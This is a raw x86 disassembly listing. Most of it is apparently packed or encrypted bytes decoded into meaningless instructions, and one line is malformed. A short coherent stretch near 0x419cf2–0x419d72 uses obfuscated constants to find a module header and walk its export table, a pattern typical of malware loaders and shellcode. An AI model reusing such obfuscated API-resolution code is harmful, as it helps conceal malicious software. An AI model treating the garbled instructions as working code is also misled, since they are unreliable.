  419b3a:	outs   dx,BYTE PTR ds:[esi]
  419b3b:	rcr    DWORD PTR [edi+ebx*4],0x27
  419b3f:	test   DWORD PTR [ecx+ecx*8-0xb396fee],0x82e816a3
  419b4a:	cmp    bl,dh
  419b4c:	mov    al,0xa7
  419b4e:	fld1   
  419b50:	adc    edx,DWORD PTR [esi+ecx*8+0x7b]
  419b54:	pop    ss
  419b55:	out    0x8e,al
  419b57:	mov    eax,ds:0xafbd35fd
  419b5c:	(bad)  
  419b5d:	iret   
  419b5e:	cld    
  419b5f:	call   0xe0b7:0x7cb10aea
  419b66:	pop    ebx
  419b67:	div    BYTE PTR [ecx]
  419b69:	std    
  419b6a:	mov    al,ds:0xf2b14bd8
  419b6f:	inc    ebx
  419b70:	aaa    
  419b71:	in     eax,0x40
  419b73:	mov    ebx,0x26186217
  419b78:	call   0x5059:0x41790b9f
  419b7f:	dec    edi
  419b80:	lock or al,0x6b
  419b83:	or     eax,0x9592a7ff
  419b88:	xchg   edx,eax
  419b89:	iret   
  419b8a:	push   ds
  419b8b:	push   ecx
  419b8c:	fnstsw WORD PTR [ecx+ebp*1+0x497f9b30]
  419b93:	(bad)  
  419b94:	dec    ebp
  419b95:	push   esi
  419b96:	jle    0x419b90
  419b98:	dec    esi
  419b99:	(bad)  
  419b9a:	mov    ah,0x8f
  419b9c:	sub    BYTE PTR [ecx],bl
  419b9e:	ficomp DWORD PTR [ebx]
  419ba0:	jle    0x419b31
  419ba2:	sbb    DWORD PTR [ebx-0x7e0ae94],ecx
  419ba8:	or     DWORD PTR [ebx+0x10],edi
  419bab:	je     0x419b6c
  419bad:	sbb    eax,0xa68d904d
  419bb2:	ret    
  419bb3:	mov    ah,0xa5
  419bb5:	shl    BYTE PTR [ebx-0x11fe23dc],1
  419bbb:	arpl   WORD PTR [edi+eiz*4-0x39],ax
  419bbf:	out    0x75,eax
  419bc1:	(bad)  
  419bc3:	xchg   ecx,eax
  419bc4:	pushf  
  419bc5:	aaa    
  419bc6:	sbb    edi,DWORD PTR [ebx-0x41814790]
  419bcc:	pop    ebx
  419bcd:	and    BYTE PTR [ecx-0x2ca2ae8d],dl
  419bd3:	adc    al,0x30
  419bd5:	inc    esi
  419bd6:	mov    al,ds:0x242735af
  419bdb:	stos   DWORD PTR es:[edi],eax
  419bdc:	jp     0x419c27
  419bde:	aas    
  419bdf:	mov    eax,0x4a78221
  419be4:	xchg   ecx,eax
  419be5:	add    al,0x97
  419be7:	cmc    
  419be8:	mov    esp,0xafdba5e3
  419bed:	loope  0x419c47
  419bef:	sahf   
  419bf0:	jp     0x419b73
  419bf2:	sbb    dh,BYTE PTR [eax-0x1c]
  419bf5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  419bf7:	lock push ss
  419bf9:	out    dx,al
  419bfa:	imul   ebp,DWORD PTR [edx+0x7db45eec],0x71
  419c01:	mov    bh,0x55
  419c03:	dec    ebx
  419c04:	push   ecx
  419c05:	dec    ebx
  419c06:	jp     0x419c0a
  419c08:	and    eax,DWORD PTR [esi]
  419c0a:	mov    eax,ds:0x631d6fcd
  419c0f:	into   
  419c10:	or     eax,0x967cecaf
  419c15:	imul   edx,DWORD PTR [edi],0x5c
  419c18:	repz mul DWORD PTR [edi-0x4636cb22]
  419c1f:	mov    eax,0x13f7d67a
  419c24:	or     al,0xec
  419c26:	leave  
  419c27:	retf   
  419c28:	cmp    eax,0xa96d6c7e
  419c2d:	call   0x78dc:0x8a2fb5d8
  419c34:	sub    al,0x74
  419c36:	inc    eax
  419c37:	int3   
  419c38:	mov    esi,0x83d022a4
  419c3d:	scas   eax,DWORD PTR es:[edi]
  419c3e:	cdq    
  419c3f:	adc    al,0x62
  419c41:	jp     0x419ca7
  419c43:	cmp    al,0x35
  419c45:	mov    dh,cl
  419c47:	xor    BYTE PTR [ebx-0x16],bh
  419c4a:	nop
  419c4b:	mov    DWORD PTR [ebp-0x4f],edx
  419c4e:	push   esi
  419c4f:	push   0x5a57d051
  419c54:	inc    ecx
  419c55:	fidivr DWORD PTR [edx+edi*4+0x347f9371]
  419c5c:	ins    BYTE PTR es:[edi],dx
  419c5d:	in     al,0x15
  419c5f:	push   esi
  419c60:	push   edi
  419c61:	inc    ebp
  419c62:	shl    WORD PTR [ebx],cl
  419c65:	mov    ah,BYTE PTR [edx-0xb082c6c]
  419c6b:	add    edx,DWORD PTR [edi+0x4bf1b7db]
  419c71:	test   esp,esi
  419c73:	sub    al,BYTE PTR [eax]
  419c75:	shl    DWORD PTR [edx+0x6253ed2],1
  419c7b:	lea    esi,[ebx]
  419c7d:	bound  ebp,QWORD PTR [edi-0x4e]
  419c80:	push   ecx
  419c81:	xor    DWORD PTR [eax-0x45],ecx
  419c84:	jmp    0xe125127b
  419c89:	mov    ebp,0x1c081df0
  419c8e:	mov    edx,0x53fe4664
  419c93:	xor    bh,BYTE PTR [ebx]
  419c95:	sbb    dl,ah
  419c97:	daa    
  419c98:	(bad)  
  419c9a:	xchg   edi,eax
  419c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c9c:	in     al,dx
  419c9d:	xor    edx,ebx
  419c9f:	mov    edx,0x1e7f527d
  419ca4:	call   0xe7e:0xfd9323f1
  419cab:	retf   
  419cac:	dec    eax
  419cad:	fistp  WORD PTR [eax+0x17]
  419cb0:	dec    ebx
  419cb1:	mov    bh,0xe6
  419cb3:	sub    DWORD PTR [edx+0x6652e833],edx
  419cb9:	loopne 0x419c79
  419cbb:	aam    0x5c
  419cbd:	mov    esi,0xd883808a
  419cc2:	mov    dh,0x4c
  419cc4:	cmp    eax,DWORD PTR [bp+si]
  419cc7:	out    0xf0,al
  419cc9:	retf   0x379d
  419ccc:	cs mov si,0x69a5
  419cd1:	cmp    eax,0xeac4107b
  419cd6:	cmp    DWORD PTR [edx],ebx
  419cd8:	sub    al,0xc9
  419cda:	jne    0x419cff
  419cdc:	cmp    edx,DWORD PTR ds:0x8a1b6c8e
  419ce2:	push   cs
  419ce3:	retf   
  419ce4:	or     esp,eax
  419ce6:	es push es
  419ce8:	jg     0x419d4d
  419cea:	retf   
  419ceb:	mov    esp,0x8bd85d8b
  419cf0:	jge    0x419cce
  419cf2:	and    eax,esi
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	retf   0x865f
  419d86:	daa    
  419d87:	cmc    
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0xe7bd192c
  419d90:	les    ebp,FWORD PTR [edx-0xc951ebf]
  419d96:	pusha  
  419d97:	push   edx
  419d98:	out    0x57,al
  419d9a:	sbb    BYTE PTR [ecx],0x6c
  419d9d:	adc    DWORD PTR [eax+ebp*4+0x6522e0cd],0xdf999183
  419da8:	leave  
  419da9:	cdq    
  419daa:	xchg   ebx,eax
  419dab:	fwait
  419dac:	je     0x419d63
  419dae:	in     al,0x3f
  419db0:	pop    ss
  419db1:	shr    DWORD PTR [ebx+0x7c],cl
  419db4:	inc    eax
  419db5:	xchg   ebp,eax
  419db6:	out    0x69,al
  419db8:	xor    ebp,DWORD PTR [eax+0x175634bb]
  419dbe:	jecxz  0x419e38
  419dc0:	shl    al,cl
  419dc2:	in     al,0xbd
  419dc4:	pop    ss
  419dc5:	and    BYTE PTR [edi],0x6a
  419dc8:	or     esp,DWORD PTR [eax]
  419dca:	cli    
  419dcb:	dec    eax
  419dcc:	jbe    0x419d66
  419dce:	xor    eax,0x6b16bee0
  419dd3:	push   0x44c91a6b
  419dd8:	ins    DWORD PTR es:[edi],dx
  419dd9:	fisttp QWORD PTR [ecx-0x80]
  419ddc:	retf   0xa1f4
  419ddf:	pop    ds
  419de0:	push   0xe63ca720
  419de5:	not    esi
  419de7:	xor    ecx,DWORD PTR [eax]
  419de9:	jno    0x419dc1
  419deb:	sub    BYTE PTR [edx-0x7488ab39],al
  419df1:	adc    bh,BYTE PTR [ecx]
  419df3:	push   0x7a565fd9
  419df8:	ss push ecx
  419dfa:	pop    ds
  419dfb:	icebp  
  419dfc:	pop    edi
  419dfd:	sahf   
  419dfe:	arpl   WORD PTR [ecx+0x2f3fbf14],ax
  419e04:	popa   
  419e05:	xor    al,BYTE PTR [ebx]
  419e07:	sub    eax,0xf2cc7b7a
  419e0c:	lahf   
  419e0d:	push   0xc
  419e0f:	cmc    
  419e10:	dec    esp
  419e11:	popa   
  419e12:	adc    bl,BYTE PTR [eax+0x2b3d8bac]
  419e18:	mov    DWORD PTR [edx+0x31],ecx
  419e1b:	sub    al,0x1c
  419e1d:	cmp    DWORD PTR [eax+0x7ac9c66d],esi
  419e23:	fiadd  DWORD PTR [edi+0x66]
  419e26:	jne    0x419e8b
  419e28:	fucomi st,st(4)
  419e2a:	mov    ebx,0x6bacde27
  419e2f:	outs   dx,DWORD PTR ds:[esi]
  419e30:	fild   WORD PTR [ebp+0x2c2520ba]
  419e36:	pop    esp
  419e37:	cmp    al,0xc2
  419e39:	cli    
  419e3a:	ret    
  419e3b:	pop    edx
  419e3c:	ins    DWORD PTR es:[edi],dx
  419e3d:	imul   esp,DWORD PTR [ecx-0x42],0xfffffff7
  419e41:	(bad)  
  419e42:	sahf   
  419e43:	mov    ds:0x1911c3d7,al
  419e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e49:	fidiv  WORD PTR [edi-0x35]
  419e4c:	xor    BYTE PTR [ecx-0x20d61320],dl
  419e52:	(bad)
  419e55:	sbb    BYTE PTR [ebp+0x61590132],cl
  419e5b:	sub    eax,0x805e0083
  419e60:	in     al,0x58
  419e62:	pop    ss
  419e63:	mov    edi,0xa4b1e07
  419e68:	lea    edi,[esi+edx*8]
  419e6b:	rcr    BYTE PTR [eax-0x42],1
  419e6e:	adc    eax,0xbadb3870
  419e73:	aas    
  419e74:	lds    esi,FWORD PTR [ebp+ecx*8+0x4]
  419e78:	mov    bl,0x56
  419e7a:	(bad)  
  419e7c:	mov    ds:0xef11f9c1,al
  419e81:	es addr16 inc edx
  419e84:	xchg   esi,eax
  419e85:	xchg   ebx,eax
  419e86:	retf   
  419e87:	adc    esp,DWORD PTR [edi+ebp*4+0x11b6e9f]
  419e8e:	mov    DWORD PTR [ebp-0x3bd2bb1a],edi
  419e94:	rcr    bh,1
  419e96:	fsub   QWORD PTR [edi-0xc]
  419e99:	loopne 0x419e51
  419e9b:	push   esp
  419e9c:	fldenv ds:0x508d56bd
  419ea2:	push   0xd88b300a
  419ea7:	hlt    
  419ea8:	xchg   ebx,eax
  419eaa:	test   eax,0x36506a28
  419eaf:	push   0x9e0cb3df
  419eb4:	inc    ecx
  419eb5:	inc    ebp
  419eb6:	xor    eax,0x5158590f
  419ebb:	stc    
  419ebc:	and    dl,dh
  419ebe:	imul   edx,DWORD PTR [esi],0xffffffb4
  419ec1:	and    eax,0x5cf11a06
  419ec6:	mov    eax,ds:0xb673d2b7
  419ecb:	mov    WORD PTR [ebx+0x46],cs
  419ece:	popf   
  419ecf:	aas    
  419ed0:	(bad)  
  419ed1:	mov    ds:0x11f80f69,al
  419ed6:	fnstsw WORD PTR ds:0x75c2dd68
  419edc:	mov    eax,ds:0x52bea780
  419ee1:	loop   0x419f61
  419ee3:	push   esp
  419ee4:	mov    ah,0x9b
  419ee7:	bound  edi,QWORD PTR [ecx]
  419ee9:	je     0x419ea3
  419eeb:	rcr    bl,0xa0
  419eee:	xor    al,BYTE PTR [ebx+0x4f]
  419ef1:	pop    edi
  419ef2:	bound  eax,QWORD PTR [edx+0x47]
  419ef5:	aam    0x67
  419ef7:	fisubr WORD PTR [edi+ebp*1]
  419efa:	push   esp
  419efb:	aas    
  419efc:	pop    ss
  419efd:	and    DWORD PTR [eax+0x52ff8de2],eax
  419f03:	and    al,0x5c
  419f05:	ret    
  419f06:	jmp    0xd427:0x2a8aaa92
  419f0d:	dec    esi
  419f0e:	sbb    bh,al
  419f10:	xchg   esp,eax
  419f11:	loopne 0x419f73
  419f13:	sti    
  419f14:	fdivr  QWORD PTR [ecx+edi*1-0x6eb07d99]
  419f1b:	out    0xc5,eax
  419f1d:	sub    al,0xd3
  419f1f:	sub    DWORD PTR [edi-0x5315f1d7],eax
  419f25:	pop    ds
  419f26:	adc    eax,0xc995fe5f
  419f2b:	mov    esi,0x1191be1b
  419f30:	pop    eax
  419f31:	ds add eax,0x64c501c
  419f37:	mov    al,0x37
  419f39:	stos   DWORD PTR es:[edi],eax
  419f3a:	jb     0x419ed8
  419f3c:	sub    al,0x82
  419f3e:	inc    edi
  419f3f:	fiadd  DWORD PTR [esi+0x2c971dd3]
  419f45:	cmc    
  419f46:	punpcklwd mm3,DWORD PTR [ebp-0x526005bc]
  419f4d:	jp     0x419f98
  419f4f:	fwait
  419f50:	and    BYTE PTR [ebp-0x69],ah
  419f53:	cmp    DWORD PTR [edx+ebp*4+0x464fc111],ecx
  419f5a:	jo     0x419f07
  419f5c:	dec    esi
  419f5d:	dec    esi
  419f5e:	push   eax
  419f5f:	xchg   DWORD PTR [ebp+0x15],edi
  419f62:	xor    ebx,edx
  419f64:	cmp    BYTE PTR [ebp+0x22],ah
  419f67:	or     BYTE PTR [eax-0x8953e38],cl
  419f6d:	adc    al,0x98
  419f6f:	cmc    
  419f70:	cdq    
  419f71:	push   eax
  419f72:	and    BYTE PTR [ecx+0x43],dl
  419f75:	jo     0x419f43
  419f77:	jno    0x419fcb
  419f79:	inc    esi
  419f7a:	pop    esp
  419f7b:	pop    es
  419f7c:	retf   
  419f7d:	inc    eax
  419f7e:	cs and al,0x74
  419f81:	inc    esi
  419f82:	add    al,0x84
  419f84:	inc    esi
  419f85:	pop    ebx
  419f86:	mov    ch,0xdb
  419f88:	push   0xb8e13616
  419f8d:	push   esi
  419f8e:	xor    DWORD PTR [ebx-0x47e3edac],ebx
  419f94:	cmp    BYTE PTR [ebx+0x1a],ch
  419f97:	ins    DWORD PTR es:[edi],dx
  419f98:	mov    esp,0x1a3c0055
  419f9d:	shl    BYTE PTR [edx-0xf],0x11
  419fa1:	dec    esp
  419fa2:	inc    edx
  419fa3:	mov    ch,BYTE PTR [edx+0xa]
  419fa6:	jle    0x419f97
  419fa8:	sub    BYTE PTR [edx+0x39],al
  419fab:	(bad)  
  419fac:	std    
  419fad:	xor    ecx,ebx
  419faf:	fwait
  419fb0:	adc    esp,esi
  419fb2:	pushf  
  419fb3:	xor    al,0x75
  419fb5:	mov    ds:0x155d1d7,al
  419fba:	xor    al,0x46
  419fbc:	jae    0x419f4d
  419fbe:	or     al,0xf7
  419fc0:	sti    
  419fc1:	rol    DWORD PTR [ebp+0x63609c],1
  419fc7:	xchg   ebp,eax
  419fc8:	dec    eax
  419fc9:	mov    edi,0xd7f44c91
  419fce:	fdivr  QWORD PTR ds:0x58d00e7f
  419fd4:	xor    eax,0x688937d
  419fd9:	sub    dl,BYTE PTR [eax+ecx*8]
  419fdc:	push   ebp
  419fdd:	push   ecx
  419fde:	icebp  
  419fdf:	pop    eax
  419fe0:	adc    edi,DWORD PTR ss:[ebp+0x3f]
  419fe4:	push   0x2bff5f9c
  419fe9:	push   esi
  419fea:	in     al,dx
  419feb:	or     eax,0x2418ba99
  419ff0:	cli    
  419ff1:	mov    dh,0x81
  419ff3:	cmp    DWORD PTR [ebx-0x2988fe41],ebx
  419ff9:	mov    ah,0x19
  419ffb:	outs   dx,BYTE PTR ds:[esi]
  419ffc:	push   ss
  419ffd:	xor    eax,esi
  419fff:	push   cs
  41a000:	sbb    cl,0xb4
  41a003:	mov    esi,0x3edf3a5f
  41a008:	psllq  mm3,mm5
  41a00b:	dec    esp
  41a00c:	xchg   esp,eax
  41a00d:	dec    ebp
  41a00e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a00f:	xlat   BYTE PTR fs:[ebx]
  41a011:	loope  0x419ff2
  41a013:	xor    eax,ebx
  41a015:	and    cl,bh
  41a017:	jmp    0xa15e8d3b
  41a01c:	frstor [edx]
  41a01e:	imul   ebp,esp,0xffffff92
  41a021:	adc    DWORD PTR [edi-0x8],esi
  41a024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a025:	inc    eax
  41a026:	sbb    BYTE PTR es:[esi],bh
  41a029:	and    cl,BYTE PTR [ecx-0x3a]
  41a02c:	leave  
  41a02d:	arpl   WORD PTR [edi+0x52597a5c],cx
  41a033:	mov    esi,0x11776eac
  41a038:	daa    
  41a039:	inc    edi
  41a03a:	js     0x41a0ae
  41a03c:	pop    esp
  41a03d:	clc    
  41a03e:	add    eax,0xe2a57b03
  41a043:	jp     0x419ff2
  41a045:	or     ebp,eax
  41a047:	jb     0x41a014
  41a049:	std    
  41a04a:	loop   0x41a0a9
  41a04c:	mov    eax,ds:0x134f1a37
  41a051:	and    ebp,edi
  41a053:	retf   0x8474
  41a056:	addr16 push edx
  41a058:	jno    0x419fe3
  41a05a:	int3   
  41a05b:	int3   
  41a05c:	dec    edi
  41a05d:	popa   
  41a05e:	loop   0x419fe5
  41a060:	arpl   dx,bp
  41a062:	mov    bh,0x7c
  41a064:	clc    
  41a065:	in     eax,0x50
  41a067:	ret    
  41a068:	add    eax,0x99af8c7f
  41a06d:	je     0x41a00c
  41a06f:	mov    bl,0x13
  41a071:	jl     0x41a0d7
  41a073:	out    0xe,al
  41a075:	jnp    0x41a0f0
  41a077:	and    ch,dh
  41a079:	mov    al,ds:0x2320110d
  41a07e:	inc    edx
  41a07f:	sub    DWORD PTR [ebp-0x44],edx
  41a082:	pop    ecx
  41a083:	and    al,0xce
  41a085:	jp     0x41a0bb
  41a087:	xchg   esp,eax
  41a088:	adc    al,BYTE PTR [edx+0x1b]
  41a08b:	push   ebp
  41a08c:	fistp  DWORD PTR [ebx+eiz*1]
  41a08f:	cmp    eax,0x4bef81e3
  41a094:	fild   DWORD PTR [esi]
  41a096:	enter  0x65ec,0x5
  41a09a:	mov    edi,0x893cee13
  41a09f:	out    dx,eax
  41a0a0:	mov    dh,0x36
  41a0a2:	adc    eax,0x577159ab
  41a0a7:	bound  ecx,QWORD PTR es:[ebx+0x47cd062e]
  41a0ae:	mov    ebx,0xaa40ac7f
  41a0b3:	or     edx,DWORD PTR [edx-0x432dc366]
  41a0b9:	es jecxz 0x41a0aa
  41a0bc:	call   0x5c56:0xe27d3919
  41a0c3:	and    DWORD PTR [eax+0x32dc18d6],0xfa8aec1b
  41a0cd:	cdq    
  41a0ce:	outs   dx,DWORD PTR ds:[esi]
  41a0cf:	out    dx,eax
  41a0d0:	inc    esp
  41a0d1:	mov    BYTE PTR ds:[eax+0x5b8f0740],dh
  41a0d8:	lahf   
  41a0d9:	jmp    0x6434:0x58323cb1
  41a0e0:	adc    edx,0x623ce952
  41a0e6:	or     eax,0x630176a1
  41a0eb:	add    DWORD PTR [edx],edx
  41a0ed:	push   0xcf4851eb
  41a0f2:	cmp    BYTE PTR [ecx+0x75d16562],ah
  41a0f8:	nop
  41a0f9:	mov    ds:0xa44c95e5,al
  41a0fe:	repz jg 0x41a097
  41a101:	xchg   ebx,eax
  41a102:	ret    
  41a103:	push   0x53
  41a105:	aam    0x8b
  41a107:	ins    BYTE PTR es:[edi],dx
  41a108:	les    eax,FWORD PTR [edx+0xf]
  41a10b:	or     dl,BYTE PTR [ebx-0x35]
  41a10e:	es mov esp,0xb7c5845e
  41a114:	cmc    
  41a115:	mov    ds:0x3dcd26db,eax
  41a11a:	loop   0x41a14b
  41a11c:	cmp    bh,BYTE PTR [edx-0x49]
  41a11f:	ss cwde 
  41a121:	sbb    esp,edi
  41a123:	sub    DWORD PTR [ebp+0x5ac4352c],esi
  41a129:	push   esi
  41a12a:	aaa    
  41a12b:	scas   eax,DWORD PTR es:[edi]
  41a12c:	mov    WORD PTR [edx],fs
  41a12e:	xchg   BYTE PTR [ebp+ebp*2+0x71bd8403],dh
  41a135:	popf   
  41a136:	inc    ebp
  41a137:	out    0xc6,eax
  41a139:	lahf   
  41a13a:	and    al,0xe
  41a13c:	popf   
  41a13d:	scas   al,BYTE PTR es:[edi]
  41a13e:	cs fwait
  41a140:	pop    ebx
  41a141:	pop    eax
  41a142:	pushf  
  41a143:	jp     0x41a0e4
  41a145:	jle    0x41a11f
  41a147:	test   eax,0x4c9d2520
  41a14c:	sub    BYTE PTR [ebx-0x6e],cl
  41a14f:	out    0x32,al
  41a151:	sbb    ebp,ecx
  41a153:	push   0x57
  41a155:	pop    ds
  41a156:	xor    al,0x5e
  41a158:	repnz pop edi
  41a15a:	and    edx,DWORD PTR [edx+0x2]
  41a15d:	mov    ch,0x74
  41a15f:	xchg   edx,eax
  41a160:	mov    ecx,ecx
  41a162:	iret   
  41a163:	icebp  
  41a164:	pop    esp
  41a165:	inc    ebp
  41a166:	push   0xffffffa0
  41a168:	xchg   esi,eax
  41a169:	(bad)  [ecx]
  41a16b:	repnz or edi,DWORD PTR [ecx]
  41a16e:	into   
  41a16f:	lahf   
  41a170:	push   esi
  41a171:	push   ebx
  41a172:	sahf   
  41a173:	xchg   esi,eax
  41a174:	push   0xffffffda
  41a176:	into   
  41a177:	dec    eax
  41a178:	mov    edi,0xd9854ef8
  41a17d:	sub    DWORD PTR [esi+0x75],ecx
  41a180:	les    ecx,FWORD PTR [edi+ecx*8+0x423ac1fe]
  41a187:	pop    ss
  41a188:	xlat   BYTE PTR ds:[ebx]
  41a189:	in     al,0xd5
  41a18b:	loop   0x41a1fa
  41a18d:	or     cl,BYTE PTR [edx-0x54]
  41a190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a191:	ficomp DWORD PTR [ecx]
  41a193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a194:	mov    eax,ds:0x795e82d5
  41a199:	cli    
  41a19a:	lds    esp,FWORD PTR [eax]
  41a19c:	xchg   ebx,ecx
  41a19e:	mov    ds,WORD PTR [edx+0x5c833d0c]
  41a1a4:	jecxz  0x41a185
  41a1a6:	push   edi
  41a1a7:	dec    esp
  41a1a8:	sub    edx,DWORD PTR [ebx]
  41a1aa:	fistp  WORD PTR [edx]
  41a1ac:	and    ah,BYTE PTR [ecx+ebx*4+0x7bfd92a2]
  41a1b3:	sbb    al,BYTE PTR [esp+ebp*1-0x63f57c1f]
  41a1ba:	push   0x46
  41a1bc:	pop    edx
  41a1bd:	repnz sub BYTE PTR [edx],ah
  41a1c0:	mov    dh,0x1e
  41a1c2:	ds out dx,al
  41a1c4:	cld    
  41a1c5:	jnp    0x41a19f
  41a1c7:	dec    edi
  41a1c8:	lahf   
  41a1c9:	fisubr DWORD PTR ds:0x5499da34
  41a1cf:	enter  0xb4de,0xbf
  41a1d3:	data16 add bh,cl
  41a1d6:	popf   
  41a1d7:	lods   al,BYTE PTR ds:[esi]
  41a1d8:	push   0x18662732
  41a1dd:	(bad)  
  41a1de:	std    
  41a1df:	and    DWORD PTR [edx],ebp
  41a1e1:	xchg   edi,eax
  41a1e2:	inc    esi
  41a1e3:	gs mov edi,0x67d102f6
  41a1e9:	and    al,0x3f
  41a1eb:	cmp    al,0x9c
  41a1ed:	(bad)  
  41a1ee:	sub    bl,ah
  41a1f0:	addr16 ret 
  41a1f2:	jle    0x41a20b
  41a1f4:	adc    edi,ebx
  41a1f6:	daa    
  41a1f7:	cdq    
  41a1f8:	loope  0x41a240
  41a1fa:	fiadd  DWORD PTR [esi-0x1f]
  41a1fd:	retf   0x2c2
  41a200:	rcl    BYTE PTR [esi+0x1e],0x25
  41a204:	jb     0x41a23d
  41a206:	pop    eax
  41a207:	xchg   esp,eax
  41a208:	lds    ebx,FWORD PTR [ecx]
  41a20a:	(bad)  
  41a20b:	ficom  WORD PTR [esi-0x29]
  41a20e:	or     ebp,DWORD PTR [eax]
  41a210:	cmp    eax,0x2b20050
  41a215:	and    ah,bh
  41a217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a218:	jo     0x41a254
  41a21a:	fwait
  41a21b:	ret    
  41a21c:	mov    esp,0x9655bf87
  41a221:	push   0xfffffffd
  41a223:	fst    DWORD PTR [edx-0x64fecdcc]
  41a229:	push   ss
  41a22a:	cld    
  41a22b:	cmc    
  41a22c:	outs   dx,DWORD PTR ds:[esi]
  41a22d:	sbb    dh,BYTE PTR [edi+0x338750b3]
  41a233:	test   BYTE PTR [ebp+0x186956e],dh
  41a239:	mov    ch,0x35
  41a23b:	jnp    0x41a22b
  41a23d:	mov    esp,0x3ed454d2
  41a242:	aam    0x21
  41a244:	jb     0x41a1c8
  41a246:	ja     0x41a1ee
  41a248:	out    0x56,al
  41a24a:	std    
  41a24b:	jecxz  0x41a2a3
  41a24d:	or     ecx,DWORD PTR [ebx]
  41a24f:	unpckhps xmm7,XMMWORD PTR [edi-0x11057d76]
  41a256:	sahf   
  41a257:	cmp    al,0x46
  41a259:	in     al,0x34
  41a25b:	leave  
  41a25c:	sar    DWORD PTR [ecx],0xba
  41a25f:	imul   edi,DWORD PTR [edx+0x64],0x497439aa
  41a266:	dec    eax
  41a267:	sbb    edx,DWORD PTR [ecx-0x36464bb1]
  41a26d:	dec    edi
  41a26e:	mov    al,0x56
  41a270:	push   ss
  41a271:	(bad)  
  41a273:	or     dl,BYTE PTR [edi]
  41a275:	pop    ss
  41a276:	sub    al,BYTE PTR [ebx]
  41a278:	mov    edx,0xe0e10a9b
  41a27d:	jmp    0x41a2ec
  41a27f:	mov    ecx,DWORD PTR [edi-0xc]
  41a282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a283:	sub    al,0xd5
  41a285:	out    dx,eax
  41a286:	add    dl,BYTE PTR [ecx+0x23]
  41a289:	sbb    ebx,ecx
  41a28b:	fist   WORD PTR [edi-0x11630c88]
  41a291:	xor    eax,0xc31b353d
  41a296:	or     ecx,DWORD PTR [ebx]
  41a298:	push   edi
  41a299:	mov    BYTE PTR [ecx],0x15
  41a29c:	adc    edx,esi
  41a29e:	mov    bl,0xb6
  41a2a0:	pop    ds
  41a2a1:	push   esp
  41a2a2:	shl    DWORD PTR [ebp+0x3b913e2e],0x3a
  41a2a9:	and    DWORD PTR [eax+0x1d4ef569],ecx
  41a2af:	int    0x84
  41a2b1:	jecxz  0x41a30b
  41a2b3:	fcomp  DWORD PTR [edx-0x67]
  41a2b6:	and    DWORD PTR [eax],ecx
  41a2b8:	and    bh,0x60
  41a2bb:	loop   0x41a2c1
  41a2bd:	(bad)  
  41a2be:	cwde   
  41a2bf:	dec    esp
  41a2c0:	stos   BYTE PTR es:[edi],al
  41a2c1:	jecxz  0x41a32d
  41a2c3:	xchg   ebx,eax
  41a2c4:	not    BYTE PTR [edi+0x4f]
  41a2c7:	xchg   edi,eax
  41a2c8:	sbb    eax,ebx
  41a2ca:	and    ebp,DWORD PTR [eax-0x3b00e96d]
  41a2d0:	pop    ds
  41a2d1:	data16 sti 
  41a2d3:	sti    
  41a2d4:	and    al,0xbe
  41a2d6:	xchg   esp,eax
  41a2d7:	in     al,0xdc
  41a2d9:	js     0x41a26b
  41a2db:	add    al,0x1b
  41a2dd:	inc    ebp
  41a2de:	jnp    0x41a278
  41a2e0:	and    esi,DWORD PTR [ebp+0x1b73344c]
  41a2e6:	pop    esi
  41a2e7:	popf   
  41a2e8:	pop    eax
  41a2e9:	daa    
  41a2ea:	pop    ebx
  41a2eb:	mov    ebx,?
  41a2ed:	and    esi,DWORD PTR [edi]
  41a2ef:	xchg   BYTE PTR [edi+ebx*2+0x49],ch
  41a2f3:	ret    0x250c
  41a2f6:	xor    ebp,DWORD PTR [edi-0x43]
  41a2f9:	loopne 0x41a359
  41a2fb:	push   0x2d1c5477
  41a300:	dec    ebx
  41a301:	ds jno 0x41a337
  41a304:	adc    al,0x83
  41a306:	jge    0x41a324
  41a308:	xor    al,0x40
  41a30a:	sub    al,0x9b
  41a30c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a30f:	fild   WORD PTR ds:0x8eca172b
  41a315:	adc    ebx,DWORD PTR [edi]
  41a317:	jmp    0x1ea9:0x5fc50f17
  41a31e:	pop    ds
  41a31f:	pusha  
  41a320:	mov    al,0xd7
